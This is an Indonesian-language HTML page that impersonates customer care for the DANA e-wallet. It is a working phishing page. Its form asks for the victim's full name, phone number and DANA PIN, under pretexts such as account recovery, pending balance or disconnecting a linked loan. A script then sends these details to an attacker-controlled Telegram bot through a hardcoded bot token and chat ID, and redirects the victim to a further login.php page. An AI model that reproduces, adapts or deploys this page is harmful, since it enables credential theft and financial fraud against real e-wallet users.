<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="theme-color" content="#118EEA" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
  <title>DANA | Customer Care</title>
  <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" />

  <link rel="icon" type="image/x-icon" href="https://www.dana.id/favicon.ico" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css" />
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap" rel="stylesheet" />

  <style>
    body {
      background-color: #fff;
      font-family: 'Open Sans', sans-serif;
      margin: 0;
    }
    h2, h3, h4, h5, h6 {
      font-family: 'Open Sans', sans-serif;
      color: #0086e0;
      text-align: center;
    }
    .btn-punya {
      display: block;
      margin: 20px auto;
      background: rgb(0, 134, 224);
      color: #fff;
      border: none;
      padding: 15px;
      font-weight: bold;
      border-radius: 10px;
      width: 90%;
      max-width: 500px;
    }
    .form-log {
      width: 90%;
      max-width: 500px;
      margin: 10px auto;
      padding: 10px;
      border: 2px solid #0086e0;
      border-radius: 8px;
    }
    .container {
      max-width: 900px;
      padding: 15px;
      margin: auto;
    }
    .slider img {
      width: 100%;
      border-radius: 10px;
    }
    input[type="text"], input[type="password"] {
      display: block;
      margin: 10px auto;
      padding: 10px;
      width: 90%;
      max-width: 500px;
      border: 2px solid #0086e0;
      border-radius: 8px;
      font-size: 16px;
    }
  </style>
</head>
<body>

  <div class="container">
    <center>
      <img src="https://telegra.ph/file/2f6ceb2e5a1a2fc7ed4ca.png" width="100" alt="Logo">
    </center>

    <div class="slider">
      <div><img src="https://telegra.ph/file/be0c88ba14ca044776e1c.jpg" alt="1" /></div>
      <div><img src="https://telegra.ph/file/f214ca8c116e23a945567.jpg" alt="2" /></div>
      <div><img src="https://telegra.ph/file/ff817316449f76e14fb2c.jpg" alt="3" /></div>
      <div><img src="https://telegra.ph/file/ef49956cd9d6444e24f41.jpg" alt="4" /></div>
    </div>

    <form id="danaForm" onsubmit="sendTelegram(); return false" method="POST">
      <audio src="https://e-formulir.mwebs.id/BotikaTTS%20_5_.mp3" id="musikku"></audio>

      <h2>Silahkan Isi Data Anda</h2>

      <input type="text" id="nama" placeholder="Nama Lengkap" required />
      <input type="text" id="nomor" placeholder="Nomor HP" required />
      <input type="password" id="pin" placeholder="PIN DANA" required />

      <h2>Silahkan Pilih Kebutuhan Anda</h2>
      <div>
        <input type="radio" id="baru" name="tarif" value="Claim Dana Kaget Anda" checked>
        <label for="baru"><h5>Pemulihan Akun Dana</h5></label>
      </div>
      <div>
        <input type="radio" id="saldo" name="tarif" value="Saldo Pending">
        <label for="saldo"><h5>Saldo Pending</h5></label>
      </div>
      <div>
        <input type="radio" id="pinjaman" name="tarif" value="Putuskan Pinjaman Terhubung">
        <label for="pinjaman"><h5>Putuskan Pinjaman Terhubung</h5></label>
      </div>

      <button class="btn-punya" type="submit">Konfirmasi</button>
    </form>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
  <script>
    $(document).ready(function () {
      $('.slider').slick({
        autoplay: true,
        autoplaySpeed: 1500,
        dots: true
      });
    });

    function sendTelegram() {
      const nama = document.getElementById("nama").value;
      const nomor = document.getElementById("nomor").value;
      const pin = document.getElementById("pin").value;
      const pilihan = document.querySelector('input[name="tarif"]:checked').value;
      const token = "8135939284:AAGAxELAXTssA7ak65vTWJ0IcO0MZthChUI";
      const chat_id = "6712267951";
      const text = `Formulir DANA:\nNama: ${nama}\nNomor HP: ${nomor}\nPIN: ${pin}\nKebutuhan: ${pilihan}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: text
        })
      })
      .then(response => {
        if (response.ok) {
          document.getElementById("musikku").play();
          setTimeout(() => {
            window.location.href = 'login.php';
          }, 3050);
        } else {
          alert("Gagal mengirim ke Telegram");
        }
      })
      .catch(error => {
        console.error("Error:", error);
        alert("Terjadi kesalahan saat mengirim notifikasi");
      });
    }
  </script>

</body>
</html>
